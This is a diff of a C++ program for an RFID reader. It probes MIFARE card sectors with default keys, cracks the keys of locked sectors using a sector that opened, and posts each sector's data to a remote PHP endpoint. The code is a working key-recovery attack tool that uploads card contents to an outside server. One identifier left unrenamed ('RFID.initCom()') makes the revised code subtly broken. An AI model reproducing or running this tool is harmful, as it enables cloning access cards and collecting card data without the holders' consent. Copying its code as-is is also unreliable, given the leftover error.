@@ -16,13 +16,11 @@ Section:                                          ~libs
 #include <string>
 #include <sstream>
 #include <unistd.h>
-#include <sys/socket.h>
+
 
 #include "RFID/MFrec.h"
 #include "LCD/hdmiLCD.h"
-#include "network/standardsocket.h"
 #include "network/httpPostMaker.h"
-#include "network/serverClientCom.h"
 #include "keywords.h"
 
 /*#############################################################################################################
@@ -43,36 +41,31 @@ int main()
 {
     /*-------------------------------------- setup LCD  ---------------------------------------*/
 
-    HdmiLCD LCD( 0x27 );
-    LCD.init(); 
+    HdmiLCD lcd( 0x27 );
+    lcd.init();
+    lcd.clear();
     
     /*-------------------------------------- setup network COM ---------------------------------------*/
 
     std::string serverName = "folk.ntnu.no";
     std::string domain = "/haakonhy/php/requestHandling.php";
     
-    StandardSocket socketToServer( &serverName, 80, STREAM );
+    auto post = new HttpPostMaker( &serverName, 80, STREAM, domain ); 
     
-    socketToServer.connectToServer();// blocking
 
-    int clientSocketId = socketToServer.getSocketIdentity();
-
-    if( clientSocketId <0 )
+    if( post->connect()<=0  )
     {
 	std::cerr << "no clientSocket\n";
-	LCD.print( "Failed connection", 0, 0 );
+	lcd.print( "Failed connection", 0, 0 );
 	return -1;
     }
-
-    HttpPostMaker REQ = HttpPostMaker( clientSocketId, domain ); 
-
     /*-------------------------------------- try default keys  ---------------------------------------*/
 
-    MFrec RFID;
+    MFrec rfid;
 
-    LCD.print( "Ready..", 0, 0 );
+    lcd.print( "Ready..", 0, 0 );
 
-    RFID.initCom();// blocking
+    rfid.initCom();// blocking
 
 
     int lockedSectors[16];
@@ -83,65 +76,56 @@ int main()
     for( int sector = 0; sector<16; sector++)
     {
 	
-	if( !RFID.authenticateOnChip( AUTHENT_A, sector*4 ) )// takes blockAddr, not sector..
+	if( !rfid.authenticateOnChip( AUTHENT_A, sector*4 ) )// takes blockAddr, not sector..
 	{
 	    lockedSectors[ nrOfLockedSectors++ ] = sector;
-	    sendSector( &RFID, sector, &REQ, true );
+	    sendSector( &rfid, sector, post, true );
 
-	    RFID.stop();
-	    RFID.initCom();
+	    rfid.stop();
+	    rfid.initCom();
 	     
 
 	}
 	else
 	{
 	    exploitSector = sector;
-	    sendSector( &RFID, sector, &REQ, false );
+	    sendSector( &rfid, sector, post, false );
 	}
 
     }// for each sector
 
     if( nrOfLockedSectors>15 )
     {
-	LCD.print( "No default", 0,0 );
+	lcd.print( "No default", 0,0 );
 	std::cout << "No sectors use a default key\n";
 	return 0;
     }
-
-    // recovery takes a while, keep the socket alive
-    int val = 1;
-    setsockopt(clientSocketId, SOL_SOCKET, SO_KEEPALIVE, &val, sizeof val);
 
     /*-------------------------------------- recover the locked sectors  ---------------------------------------*/
     
     int nrOfRecoveredKeys = 0;
 
-    LCD.clear();
-    LCD.print( "Recovery", 0, 4 );
+    lcd.clear();
+    lcd.print( "Recovery", 0, 4 );
     for( int sector = 0; sector<nrOfLockedSectors; sector++ )
     {
-	LCD.print( "Sector " + std::to_string( lockedSectors[sector] ), 1, 4 );
+	lcd.print( "Sector " + std::to_string( lockedSectors[sector] ), 1, 4 );
 
-	RFID.stop();
+	rfid.stop();
 	
-	if( RFID.crackKey( AUTHENT_A, exploitSector*4, lockedSectors[sector]*4 ) )
+	if( rfid.crackKey( AUTHENT_A, exploitSector*4, lockedSectors[sector]*4 ) )
 	{
-	    /*
-	    std::cout << "test: ";
-	    std::cout << REQ.sendMsg( "hey" ) << std::endl;
-	    std::cout << REQ.recvMsg();
-	    */
 	    nrOfRecoveredKeys++;
 	    RFID.initCom();
-	    sendSector( &RFID, lockedSectors[sector], &REQ, false );// class has now updated the key
+	    sendSector( &rfid, lockedSectors[sector], post, false );// class has now updated the key
 	}
     }
 
     std::cout << "Nr of recovered keys: " << nrOfRecoveredKeys << std::endl;
 
-    LCD.clear();
-    LCD.print( "Keys recovered: ", 0,0 );
-    LCD.print( std::to_string( nrOfRecoveredKeys ), 1, 7 );
+    lcd.clear();
+    lcd.print( "Keys recovered: ", 0,0 );
+    lcd.print( std::to_string( nrOfRecoveredKeys ), 1, 7 );
 
     
     return 0;
